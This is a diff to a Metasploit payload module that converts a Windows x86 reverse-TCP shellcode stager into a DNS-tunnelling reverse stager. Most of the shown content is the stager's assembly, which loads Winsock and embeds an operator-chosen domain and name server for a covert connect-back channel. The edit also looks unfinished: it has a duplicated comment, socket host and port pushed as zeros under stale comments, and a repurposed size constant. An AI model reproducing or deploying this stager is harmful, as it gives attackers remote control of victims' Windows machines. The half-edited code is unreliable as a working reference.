@@ -10,7 +10,7 @@ module Msf
 
 ###
 #
-# Complex reverse_tcp payload generation for Windows ARCH_X86
+# Complex reverse_dns payload generation for Windows ARCH_X86
 #
 ###
 
@@ -40,7 +40,7 @@ module Payload::Windows::ReverseDns
       conf[:reliable] = true
     end
 
-    generate_reverse_tcp(conf)
+    generate_reverse_dns(conf)
   end
 
   #
@@ -52,20 +52,20 @@ module Payload::Windows::ReverseDns
   end
 
   def transport_config(opts={})
-    transport_config_reverse_tcp(opts)
+    transport_config_reverse_dns(opts)
   end
 
   #
   # Generate and compile the stager
   #
-  def generate_reverse_tcp(opts={})
+  def generate_reverse_dns(opts={})
     combined_asm = %Q^
       cld                    ; Clear the direction flag.
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
       start:
         pop ebp
-      #{asm_reverse_tcp(opts)}
+      #{asm_reverse_dns(opts)}
       #{asm_block_recv(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
@@ -87,35 +87,42 @@ module Payload::Windows::ReverseDns
     space += uuid_required_size if include_send_uuid
 
     # The final estimated size
+    # The final estimated size
     space
   end
 
   #
   # Generate an assembly stub with the configured feature set and options.
   #
-  # @option opts [Integer] :port The port to connect to
-  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
+  # @option opts [String]  :domain DOMAIN that wll be used for tunnel
+  # @option opts [String]  :ns_server Optional: NS server, that will be used.
   # @option opts [Integer] :retry_count Number of retry attempts
   #
-  def asm_reverse_tcp(opts={})
+  def asm_reverse_dns(opts={})
 
     retry_count  = [opts[:retry_count].to_i, 1].max
-    encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
-    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
+    domain       = opts[:domain]
+    ns_server    = opts[:ns_server]
 
     asm = %Q^
       ; Input: EBP must be the address of 'api_call'.
-      ; Output: EDI will be the socket for the connection to the server
+      ; Output: EDI ...
       ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
-
-      reverse_tcp:
+      jmp reverse_dns
+      
+      hostname:
+        db "aaaa.stg0.#{opts[:host]}", 0x00
+      ns_server:
+        db "#{opts[:ns_server]}", 0x00
+        
+      reverse_dns:
         push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
         push 'ws2_'             ; ...
         push esp                ; Push a pointer to the "ws2_32" string on the stack.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call ebp                ; LoadLibraryA( "ws2_32" )
 
-        mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
+        mov eax, 0x0202         ; EAX = wVersionRequested
         sub esp, eax            ; alloc some space for the WSAData structure
         push esp                ; push a pointer to this stuct
         push eax                ; push the wVersionRequested parameter
@@ -124,10 +131,10 @@ module Payload::Windows::ReverseDns
 
       set_address:
         push #{retry_count}     ; retry counter
-
+     
       create_socket:
-        push #{encoded_host}    ; host in little-endian format
-        push #{encoded_port}    ; family AF_INET and port number
+        push 0                 ; host in little-endian format
+        push 0                 ; family AF_INET and port number
         mov esi, esp            ; save pointer to sockaddr struct
 
         push eax                ; if we succeed, eax will be zero, push zero for the flags param.
